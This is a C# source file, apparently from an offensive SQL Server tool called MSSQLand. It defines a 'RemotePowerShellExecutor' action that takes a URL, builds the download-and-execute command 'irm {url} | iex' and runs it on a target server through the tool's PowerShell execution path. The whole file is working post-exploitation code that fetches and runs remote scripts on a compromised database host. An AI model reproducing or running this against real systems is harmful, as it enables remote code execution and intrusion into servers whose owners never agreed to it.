using MSSQLand.Services;
using MSSQLand.Utilities;
using System;

namespace MSSQLand.Actions.Execution
{
    internal class RemotePowerShellExecutor : PowerShell
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "URL of PowerShell script to download and execute")]
        private string _url;

        /// <summary>
        /// Validates the arguments passed to the PowerShellScriptDownloader action.
        /// </summary>
        /// <param name="args">The URL of the PowerShell script to download and execute.</param>
        public override void ValidateArguments(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                throw new ArgumentException("PowerShellScriptDownloader action requires a script URL.");
            }

            _url = string.Join(" ", args);
        }

        /// <summary>
        /// Executes the PowerShell command to download and run the script from the provided URL.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Downloading and executing PowerShell script from URL: {_url}");

            // Craft the PowerShell command to download and execute the script
            string powerShellCommand = $"irm {_url} | iex";

            // Set the crafted PowerShell command as the _command in the parent class
            base.ValidateArguments(new string[] { powerShellCommand });

            // Call the parent's Execute method to execute the command
            base.Execute(databaseContext);
            return null;
        }
    }
}
